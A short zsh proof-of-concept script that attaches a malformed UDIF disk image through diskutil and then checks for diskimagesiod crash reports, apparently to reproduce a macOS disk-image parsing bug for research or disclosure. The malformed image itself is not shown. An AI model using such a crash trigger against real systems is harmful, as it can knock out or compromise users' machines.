#!/bin/zsh
set -eu

DIR=${0:A:h}
IMG="$DIR/poc_udif_blkx_data8.dmg"

echo "[*] attaching malformed UDIF: $IMG"
set +e
OUT=$(diskutil image attach "$IMG" --noMount --nobrowse 2>&1)
RC=$?
set -e
printf "%s\n" "$OUT"

if printf "%s\n" "$OUT" | grep -q '/dev/disk'; then
  DEV=$(printf "%s\n" "$OUT" | awk '/\\/dev\\/disk/{print $1; exit}')
  if [ -n "$DEV" ]; then
    echo "[*] detaching $DEV"
    diskutil eject "$DEV" >/dev/null 2>&1 || hdiutil detach "$DEV" -force >/dev/null 2>&1 || true
  fi
fi

echo "[*] diskutil exit code: $RC"
echo "[*] newest crash reports:"
ls -t /Library/Logs/DiagnosticReports/diskimagesiod-*.ips 2>/dev/null | head -3 || true
exit "$RC"
